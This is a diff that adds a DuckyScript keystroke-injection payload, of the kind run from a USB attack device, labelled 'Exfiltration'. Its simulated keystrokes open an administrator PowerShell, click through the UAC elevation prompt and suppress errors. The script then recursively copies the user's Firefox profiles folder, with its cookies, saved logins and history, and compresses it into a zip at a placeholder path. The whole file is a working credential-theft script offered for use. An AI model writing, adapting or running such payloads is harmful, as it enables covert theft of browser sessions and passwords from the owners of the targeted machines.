@@ -1,0 +1,21 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Exfiltrate Firefox profile and store to path. Change destination Path at the very end of the string.
+REM Version: 1.0
+REM Category: Exfiltration
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1200
+ALT y
+DELAY 1200
+GUI UP
+DELAY 1200
+STRING $ErrorActionPreference = "SilentlyContinue";$folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Walkuer Ghost Report ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>";$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo-26528702.html';$Report = $Report + "<div id=body><h1>Walkuer Ghost Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>";$fireSaveDir = New-Item $userDir'\WGD\FireFox-Profile' -ItemType Directory;$fireDir = (Get-ChildItem env:userprofile).value + '\AppData\Roaming\Mozilla\Firefox\Profiles';Copy-Item $fireDir -Destination $fireSaveDir -Recurse;Start-Sleep -s 10;$Report >> $fileSaveDir'/ComputerInfo-26528702.html';Compress-Archive -Path $fileSaveDir -DestinationPath PATH\results-26528702.zip ; exit 
+ENTER
